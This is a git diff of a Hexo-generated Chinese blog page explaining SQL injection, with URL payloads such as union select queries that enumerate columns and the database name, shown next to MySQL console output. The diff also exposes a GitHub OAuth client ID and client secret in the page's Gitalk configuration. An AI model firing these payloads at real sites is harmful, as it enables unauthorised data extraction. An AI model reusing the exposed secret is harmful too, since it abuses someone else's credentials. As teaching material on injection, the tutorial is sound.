@@ -25,7 +25,8 @@
 
   
 
-<meta name="generator" content="Hexo 4.1.1"></head>
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="晴天`blog" type="application/atom+xml">
+</head>
 
 </html>
 
@@ -135,15 +136,15 @@
 
 <p><code>?id=%27 order by 3 %23</code></p>
 <p><code>?id=%27 order by 4 %23</code></p>
-<p><img src="../pic/28.png" alt=""></p>
-<p><img src="../pic/29.png" alt=""></p>
+<p><img src="/pic/28.png" alt=""></p>
+<p><img src="/pic/29.png" alt=""></p>
 <p>4报错，3没有报错，表示此表有三列。</p>
 <p><em>sql 控制台的执行结果</em></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id&#x3D;0 order by 4;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;order clause&#39;</span><br><span class="line">mysql&gt; select * from user where id&#x3D;0 order by 3;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
 
 <p>查看回显位置</p>
 <p><code>?id=%27 union select 1,2,3 %23</code></p>
-<p><img src="../pic/30.png" alt="">  2，3处有回显。</p>
+<p><img src="/pic/30.png" alt="">  2，3处有回显。</p>
 <p><em>sql控制台执行结果</em></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user where id&#x3D;0 union select 1,2,3;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | 2        | 3        |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
 
@@ -151,7 +152,7 @@
 </li>
 <li><p>获取数据库名</p>
 <p><code>?id=%27 union select 1,database() ,3 %23</code></p>
-<p><img src="../pic/31.png" alt=""></p>
+<p><img src="/pic/31.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id&#x3D;0 union select 1,database(),3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | security | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>获取表名</p>
@@ -199,7 +200,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://sunny250.github.io/2020/01/05/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86/" data-id="ck6au71oq0008mw7ed45ccy1z"
+      <a data-url="https://sunny250.github.io/2020/01/05/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86/" data-id="ck7vssfm6001bpk7e75mibn4s"
         class="article-share-link">分享</a>
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
@@ -248,11 +249,11 @@
 
   <script type="text/javascript">
     var gitalk = new Gitalk({
-      clientID: 'c2ff86b3b4668317d630# GitHub Application Client ID',
-      clientSecret: '92facc954b6661c7556b845f2cb775dfb77df12c# Client Secret',
-      repo: 'sunny250.github.io# Repository name',
-      owner: 'sunny250# GitHub ID',
-      admin: ['sunny250# GitHub ID'],
+      clientID: 'c2ff86b3b4668317d630',
+      clientSecret: '92facc954b6661c7556b845f2cb775dfb77df12c',
+      repo: 'sunny250.github.io',
+      owner: 'sunny250',
+      admin: ['sunny250'],
       // id: location.pathname,      // Ensure uniqueness and length less than 50
       id: md5(location.pathname),
       distractionFreeMode: false,  // Facebook-like distraction free mode
